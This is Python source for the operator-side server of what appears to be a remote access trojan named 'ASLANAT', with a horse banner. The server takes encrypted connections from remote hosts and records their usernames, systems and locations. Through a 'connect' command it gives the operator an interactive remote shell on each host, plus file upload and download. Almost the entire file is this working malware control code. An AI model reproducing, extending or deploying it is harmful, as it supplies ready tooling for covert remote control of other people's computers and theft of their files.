import socket
import threading
import json
import time
import os
from tabulate import tabulate
import rsa
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad,unpad
from Crypto.Random import get_random_bytes

import sys

class Data:

    Host = "192.168.0.104"
    Port = 6565
    Port_check = 2121
    data_collection = True
    json_data = {}
    client_list = []
    address_list = []
    data_cred = ["IP","Port", "HostName", "UserName", "System", "Location", "NickName", "Status","Key"]
    command_list = ["start","at", "stop", "connect", "list","clist", "help","?","nick", "history","clear","exit"]
    rsa_key = ""
    aes_key = ""
    json_help = [
        {"Commands": "connect",
         "Usage": "connect <NickName>",
         "DESCRIPTION": "Connect to Spesific Host",
         "Sub commands": "close\nftp <-d,-u>"
         },
         {"Commands": "list",
         "Usage": "list",
         "DESCRIPTION": "Show all Hosts"
         },
         {"Commands": "nick",
         "Usage": "nick <HostName> <New NickName>",
         "DESCRIPTION": "Assign or Change NickName"
         },
         {"Commands": "history",
         "Usage": "history\nhistory <HostName>",
         "DESCRIPTION": "Show Command History"
         },
         {"Commands": "start",
         "Usage": "start <NickName>",
         "DESCRIPTION": "Start Connection"
         },
         {"Commands": "stop",
         "Usage": "stop <NickName>",
         "DESCRIPTION": "Stop Connection"
         },
         {"Commands": "exit",
         "Usage": "exit",
         "DESCRIPTION": "Stop Server"
         }
    ]
    
    HORSE ="""
    ⠀⠀⠀⠀⠀⠀⢀⠀⠀⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠘⣦⡀⠘⣆⠈⠛⠻⣗⠶⣶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠈⣿⠀⠈⠳⠄⠀⠈⠙⠶⣍⡻⢿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  +====================+⡹⣿⣿⣷⣦⣄⣀⠀⠀⢀⣸⠃⠀⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  |41 53 4C 41 4E 41 54|⠻⣮⢿⣿⣿⣿⣿⣿⣿⣿⠟⠀⢰⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  +====================+⠙⢷⣿⣿⣿⣿⣟⣋⣀⣤⣴⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⢀⣼⢿⣿⡀⠀⠀⢀⣀⣴⣾⡟⠀⠈⣇⠀⠀⠀⠈⢻⡙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⣼⡏⠸⣿⣿⣶⣾⣿⡿⠟⠋⠀⠀⠀⢹⡆⠀⠀⠀⠀⠹⡽⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⣰⣿⠀⠀⠀⣀⡿⠛⠉⠀⠀⢿⠀⠀⠀⠘⣿⡄⠀⠀⠀⠀⠑⢹⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⣿⣿⣷⣶⣾⠏⠀⠀⠀⠀⠀⠘⣇⠀⠀⠀⢻⡇⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⡿⠃⠀⣠⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠈⠙⠿⠿⠋⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⢸⣷⠀⠀⠀⠀⠀⢀⠀⠹⣿⣿⣿⣿⣷⣶⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⠀⠀⠀⢸⣿⠀⠀⠀⠀⢀⡞⠀⠀⠈⠛⠻⠿⠿⠯⠥⠤⢄⣀⣀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⠀⠀⠀⢸⡇⠀⠀⠀⢀⡼⠃⠀⠀⠀⠀⠀⣄⠀⠀⠀⠀⠀⠀⠈⠙⠂⠙⠳⢤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⠇⠀⠀⠀⡾⠁⠀⠀⣠⡿⠃⠀⠀⠀⠀⠀⠀⠸⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⠀⠀⠀⡸⠃⠀⢀⣴⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣷⣶⣶⣦⣤⣀⡀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠇⠀⠀⠀⠃⢀⣴⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣶⣤⡀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠏⠀⠀⠀⠀⣰⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣧⠙⠻⣿⣿⣿⣿⣿⣿⣦⡀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⡏⠀⠀⢀⡖⢰⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠟⠀⠀⠀⢸⣿⠀⠀⠈⢿⣿⣿⣿⣿⣿⡿
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡇⠀⠀⣼⠁⠼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠋⠀⠀⠀⠀⣼⡇⠀⠀⣠⣾⣿⣿⣿⣿⠟⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠘⣇⠀⠀⢻⡄⢠⡄⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⡴⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠟⠁⠀⠀⠀⢀⣼⠏⠀⣠⣾⣿⣿⡿⣿⡿⠁⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⠁⠀⠘⠂⠀⠀⢳⠀⢳⡀⠀⠀⠀⠀⠀⠀⢀⡼⠁⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣾⣿⠃⠀⠀⠀⠀⣠⣾⠃⣠⣾⣿⣿⠿⠋⢰⡟⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⢠⣿⠃⠀⠀⠀⢀⣀⡴⠞⠙⠲⣷⡄⠀⠀⠀⠀⢠⡾⠁⠀⠀⠀⢀⣀⣠⣤⣶⠿⠟⠋⠀⡾⠀⠀⠀⢀⣴⠟⠁⢠⡟⢱⡿⠃⠀⠀⠸⣇⡀⠀⠀⠀
    ⠀⠀⠀⠀⠀⢀⡴⠟⠁⠀⣀⡤⠖⠋⠁⠀⠀⠀⠀⣸⠇⠀⠀⠀⣤⠟⠑⠋⠉⣿⠋⠉⠉⠉⠁⣠⠞⠀⠀⠀⡇⠀⠀⢠⡿⠋⠀⠀⠈⠁⡿⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀
    ⠀⠀⠀⢀⣾⣏⣤⣶⡾⠛⠉⠀⠀⠀⠀⠀⠀⢀⡼⠃⠀⠀⣠⠞⠁⠀⠀⠀⠀⣿⠀⠀⠀⢀⡼⠃⠀⠀⠀⢸⠇⠀⣰⠟⠀⠀⠀⠀⠀⠐⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⢀⣿⣿⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⢀⣴⠏⠀⠀⣠⠞⠁⠀⠀⠀⠀⠀⠀⣿⠀⠀⢀⡾⠃⠀⠀⠀⢀⡞⠀⣼⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⣼⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣶⣶⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⣾⠇⠀⠀⠀⢀⣾⣣⣾⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⢠⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⠀⢠⡟⠀⠀⠀⢀⣾⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⢀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⡄⢀⣀⡀⠀⠀⠀⠀⠀⠀⢸⡇⠀⣾⠇⠀⠀⣰⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⣾⠀⣰⠟⠀⢀⣼⣿⣿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⢸⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠿⠿⠿⠿⠿⠿⠃⠀⠀⠀⢸⣿⣶⠏⢀⣴⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⢸⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⠃⢠⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⢿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⢃⣴⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠈⠛⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣧⣾⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⡟⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⠁⠀⠀⠈⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠿⠿⠿⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    """
class colour:
    END         = "\033[0m"

    BOLD        = "\033[1m"
    ITALIC      = "\033[3m"
    UNDERLINE   = "\033[4m"

    BG_BLACK    = "\033[40m"
    BG_RED      = "\033[41m"
    BG_GREEN    = "\033[42m"
    BG_YELLOW   = "\033[43m"
    BG_BLUE     = "\033[44m"
    BG_PURPLE   = "\033[45m"
    BG_CYAN     = "\033[46m"
    BG_WHITE    = "\033[47m"
    BG_GRAY     = "\033[100m"

    FG_GRAY     = "\033[30m"
    FG_RED      = "\033[31m"
    FG_GREEN    = "\033[32m"
    FG_YELLOW   = "\033[33m"
    FG_BLUE     = "\033[34m"
    FG_PURPLE   = "\033[35m"
    FG_CYAN     = "\033[36m"



###################################################################################################
################                        Encrytion                        ##########################
###################################################################################################

def key_generator(client):
    rsa_pub = rsa.PublicKey.load_pkcs1(client.recv(4096),"PEM")
    aes_key = get_random_bytes(AES.block_size)
    client.send(rsa.encrypt(aes_key,rsa_pub))
    return aes_key

def encrypt_data(data,aes_key):
    iv = get_random_bytes(AES.block_size)
    cipher = AES.new(aes_key, AES.MODE_CBC,iv)
    ciphertext = cipher.encrypt(pad(data, AES.block_size))
    return cipher.iv + ciphertext

def decrypt_data(encrypted_data,aes_key):
    try:
        iv = encrypted_data[:AES.block_size]
        ciphertext = encrypted_data[AES.block_size:]
        cipher = AES.new(aes_key, AES.MODE_CBC, iv)
        decrypted_data = unpad(cipher.decrypt(ciphertext), AES.block_size)
        return decrypted_data
    except Exception as e:
        print(f"{colour.FG_RED}{e}{colour.END}")


###################################################################################################
################                      send/recv                          ##########################
###################################################################################################

def resv(client,key):
    try:
        return decrypt_data(client.recv(409632),bytes.fromhex(key)).decode()
    except Exception as e:
        print(f"{colour.FG_RED}{e}{colour.END}")

def send(client,enc,key):
    try:
        if 'bytes' in str(type(enc)):
            client.send(encrypt_data(enc,bytes.fromhex(key)))
        else:
            client.send(encrypt_data(enc.encode(),bytes.fromhex(key)))
            
    except Exception as e:
        print(f"{colour.FG_RED}{e}{colour.END}")

###################################################################################################
################                          Help                           ##########################
###################################################################################################

def help(command):
    match command:
        case "help":
            header = Data.json_help[0].keys()
            table = f"{tabulate([list(d.values()) for d in Data.json_help], headers=header)}"
            print(f"{colour.FG_CYAN+table+colour.END}")
###################################################################################################
################                         History                         ##########################
###################################################################################################


def history(command):
    try:
        f = time.localtime()
        log = f"[{f.tm_mday}.{f.tm_mon}.{f.tm_year} {f.tm_hour}:{f.tm_min}:{f.tm_sec}] {command}\n"
        with open("./Data/history.txt","a") as file:
            file.write(log)
    except:
        print(f"{colour.FG_RED}[*] History file not found !!!{colour.END}")

def log(command,nick):
    try:
        f = time.localtime()
        log = f"[{f.tm_mday}.{f.tm_mon}.{f.tm_year} {f.tm_hour}:{f.tm_min}:{f.tm_sec}] {command}\n"
        with open(f"./Data/log/{nick}.txt","a") as file:
            file.write(log)
    except:
        print(f"{colour.FG_RED}[*] History file not found !!!{colour.END}")
###################################################################################################
################                       Connections                       ##########################
###################################################################################################


def connections():
    try:
        server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        server.settimeout(1)
        try:
            server.bind((Data.Host,Data.Port))
        except:
            print(f"{colour.FG_RED}[*] Address not valid !!!{colour.END}")
            sys.exit()
        server.listen(10)
        client_collector = threading.Thread(target=client_connected,args=(server,))
        client_collector.start()
    except Exception as e:
        print(f"{colour.FG_RED}{e}{colour.END}")

    try:
        test = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        test.settimeout(1)
        test.bind((Data.Host,Data.Port_check))
        test.listen(3)
        test_connectiot = threading.Thread(target=test_connect,args=(test,))
        test_connectiot.start()
    except Exception as e:
        print(f"{colour.FG_RED}{e}{colour.END}")

    try:
        data_collect =threading.Thread(target=data_read)
        data_collect.start()
    except Exception as e:
        print(f"{colour.FG_RED}{e}{colour.END}")


        

###################################################################################################
################                     Main connection                     ##########################
###################################################################################################

def client_connected(server):
    while Data.data_collection:
        try:
            sam_client, sam_address = server.accept()
            try:
                Data.client_list.append(sam_client)
                Data.address_list.append(sam_address)
                aes_key = key_generator(sam_client)
                ticket_checker(sam_client,sam_address,aes_key.hex())
            except Exception as e:
                print(f"{colour.FG_RED}{e}{colour.END}")
        except :
            pass


def ticket_checker(client,address,key):
    HostName = resv(client,key)
    if data_check("HostName",HostName):
        new_data = {"IP" : address[0], "Port" : address[1], "Key":key}
        data_update("HostName",HostName, new_data)

        send(client,"hello",key)
    else :  
        send(client,"whoareyou",key)
                         
        info = json.loads(resv(client,key))
        new_data = {
            "IP" : address[0],
            "Port" : address[1],
            "HostName" : HostName,
            "UserName" : info["username"],
            "System": info["system"],
            "Loc": info["country"]+"/"+info["city"],
            "NickName" : HostName,
            "Status" : "True",
            "Key" : key
        }
        data_update("HostName",'\n\r',new_data)
    print(f"\n{colour.FG_GREEN}[*] {HostName} connected{colour.END}")
        

###################################################################################################
################                     Test connection                     ##########################
###################################################################################################


def test_connect(server):
    while Data.data_collection:
        try:
            client, _ = server.accept()
            try:
                HostName = client.recv(409600).decode()
                if data_check("HostName",HostName):
                    status = data_take("HostName",HostName)["Status"]
                    client.send(status.encode())
                else:
                    client.send(b'-1')  
            except Exception as e:
                print(f"{colour.FG_RED}{e}{colour.END}")
        except  :
            pass

###################################################################################################
################                          Data                           ##########################
###################################################################################################

def data_read():
    while Data.data_collection:
        try:
            with open('./Data/client_list.json') as f:
                Data.json_data = json.load(f)
            time.sleep(1)
        except Exception as e:
            print(f"{colour.FG_RED}{e}{colour.END}")

def data_check(type,name):
    for each in Data.json_data['client_list']:
        if each[type] == name:
            return True
    return False
        
def data_update(type,name,new_data):
    if name == "\n\r":
        Data.json_data['client_list'].append(new_data)
    else:
        for each in Data.json_data['client_list']:
            if each[type] == name:
                for type in Data.data_cred:
                    if type in new_data:
                        each[type] = new_data[type]
    with open("./Data/client_list.json","w") as f:
        json.dump(Data.json_data,f,indent=4)


def data_take(type,name):
    for each in Data.json_data['client_list']:
        if each[type] == name:
            return each


###################################################################################################
################                         FTP                             ##########################
###################################################################################################


def ftp(command,client,key):
    tip = command[1]
    file = command[2]

   

    def download(file,client,key):
        size = int(decrypt_data(client.recv(4128),key).decode('utf-8'))
        if size == -1:
            return "[*] Not found !!!"
        client.send(b"Naber Aslan")
        while os.path.exists(f"./Data/ftp/{file}") : 
            file +='(new)'
        chunk = decrypt_data(client.recv(4128),key)
        with open(f"./Data/ftp/{file}",'ab') as f:
            while chunk != b"\n\r":
                f.write(chunk)
                chunk = decrypt_data(client.recv(4128),key)
          

    def upload(file,client,key):
        try:
            with open(f"./Data/ftp/{file}",'rb') as f:
                client.send(encrypt_data(b'1',key))
                client.recv(4096)
                chunk = f.read(4096)
                while chunk :
                    client.send(encrypt_data(chunk,key))
                    chunk = f.read(4096)
                time.sleep(0.3)
                client.send(encrypt_data(b"\n\r",key))

        except :
            client.send(b'-1')
        
    if tip == "-d":
        download(file,client,bytes.fromhex(key))
    elif tip == "-u":
       upload(file,client,bytes.fromhex(key))


###################################################################################################
################                      Commands                           ##########################
###################################################################################################


def connect(NickName):
    if data_check("NickName",NickName):
        user=data_take("NickName",NickName)
        for client in Data.client_list :
            raddr = client.getpeername()[0] if client else None
            rport = client.getpeername()[1] if client else None
            if raddr == user["IP"] and rport == user["Port"]:
                try:
                    print(f"{colour.FG_GREEN}[*] Connected to {NickName}.{colour.END}")
                    command = ['']
                    send(client,"connect",user["Key"])
                    while command[0] != "close":
                        pwd = resv(client,user["Key"])
                        while True:
                            command = input(f"{colour.FG_RED}({NickName}) {colour.FG_CYAN+pwd} {colour.FG_PURPLE}> {colour.FG_YELLOW}").strip().split();print(colour.END,end='')
                            log(" ".join(command),user["HostName"])
                            if command == []:
                                continue
                            if command[0] == "clear" or command[0] == "cls":
                                os.system('cls' if os.name == 'nt' else 'clear')
                            elif command[0] == "ftp":
                                if len(command) != 3 or not (command[1] == "-d" or command[1] == "-u"):
                                    print(f"{colour.FG_RED}wrong command !!!{colour.END}")
                                    continue
                                send(client,' '.join(command),user["Key"])
                                ftp(command,client,user["Key"])
                                output = resv(client,user["Key"])
                                print(output,end="")
                                break

                            elif command != "":
                                send(client,' '.join(command),user["Key"])
                                output = resv(client,user["Key"])
                                print(output,end="")
                                break
                except Exception as e :
                    print(f"{colour.FG_RED}{e}{colour.END}")
                    Data.client_list.remove(client)
                    data_update("NickName",NickName,{"Status":"False"})
                    print(f"{colour.FG_GREEN}[*] {NickName}'s Status Changed as: False.{colour.FG_RED}\n[*] Client droped !!!{colour.BG_RED}")


def lists():
    try:
        data_header = Data.data_cred[:-1]
        table = f"{tabulate([list(d.values())[:-1] for d in Data.json_data['client_list']], headers=data_header)}"
        print(f"{colour.FG_CYAN}\n{table}\n{colour.END}")
    except Exception as e:
        print(f"{colour.FG_RED}[*] Empty List!!!{colour.BG_RED}")
        print(e.with_traceback())


def start(NickName):

    if data_check('NickName',NickName):
        data_update('NickName',NickName,{"Status":"True"})
        print(f"{colour.FG_GREEN}[*] {NickName}'s Status Changed as: True{colour.END}")
    else :
        print(f"{colour.FG_RED}[*] NickName not found !!!{colour.END}")


def stop(NickName):

    if data_check('NickName',NickName):
        data_update('NickName',NickName,{"Status":"False"})
        print(f"{colour.FG_GREEN}[*] {NickName}'s Status Changed as: False{colour.END}")
        user = data_take("NickName",NickName)
        for client in Data.client_list : 
            raddr = client.getpeername()[0] if client else None
            rport = client.getpeername()[1] if client else None
            if raddr == user["IP"] and rport == user["Port"]:
                print(f"{colour.FG_RED}[*] Connection closed: {NickName} !!!{colour.END}")
                send(client,"close",user["Key"])
                Data.client_list.remove(client)
    else :
        print("[*] NickName not found.")
def at():
    print(f"""{colour.FG_GREEN}+====================================================+
|49 6C 6B 69 6E  79 61 78 63 69  6F 67 6C 61 6E 64 69|
+====================================================+{colour.END}""")

def nick(HostName,NickName):
    if data_check('HostName',HostName):
        data_update('HostName',HostName,{"NickName":NickName})
        print(f"{colour.FG_GREEN}[*] {HostName}'s NickName Changed as: {NickName+colour.END}")
    else :
        print(f"{colour.FG_RED}[*] HostName not found !!!{colour.END}")

def close():
    for user in Data.json_data['client_list']:
        user["Status"] = "False"
        for client in Data.client_list:
            raddr = client.getpeername()[0] if client else None
            rport = client.getpeername()[1] if client else None
            if raddr == user["IP"] and rport == user["Port"]:
                send(client,"exit",user["Key"])
    Data.data_collection = False 
    with open('./Data/client_list.json', 'w') as f:
        json.dump(Data.json_data, f,indent=4)

def history_read(command):
    if len(command) == 1:
        with open("./Data/history.txt",'r') as f:
            print(f.read())
    elif len(command) == 2:
        HostName = data_take("NickName",command[1])["HostName"]
        try:
            with open(f"./Data/log/{HostName}.txt","r") as f:
                print(f.read())
        except:
            print(f"{colour.FG_RED}[*] no log !!!{colour.END}")
    
    
        
###################################################################################################



if __name__ == "__main__":

    connections()

    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"{colour.FG_RED+Data.HORSE}") #/#/#/#
    while True :
        
        command=input(f"{colour.FG_BLUE}ASLANAT (help,?) {colour.FG_PURPLE}> {colour.FG_YELLOW}").strip().split();print(colour.END,end='')
        while command == [] or command[0] not in Data.command_list:
            print(f'{colour.FG_GREEN}[*] Command not Found\n[*] Use help or ? for Help.{colour.END}');command = input(f"{colour.FG_BLUE}ASLANAT (help,?) {colour.FG_PURPLE}> {colour.FG_YELLOW}").strip().split();print(colour.END,end='')
        history(" ".join(command))

        match command[0]:

            case "connect" :
                connect(command[1])
            
            case "list" :
                lists()
            
            case "nick" :
                nick(command[1],command[2])
                
            case "exit":
                close()
                sys.exit()
            
            case "clear":
                os.system('cls' if os.name == 'nt' else 'clear')
            
            case "help" : 
                help("help")
                
            case "?":
                help("help")

            case "history":
                history_read(command)
                    
                
            case "clist":
                print(Data.client_list)
                
            case "start":
                start(command[1])
                
            case "stop":
                stop(command[1])
            case "at":
                at()   
                
            case _ :
                print('[*] Command not Found')
                print('[*] Use help or ? for Help.')



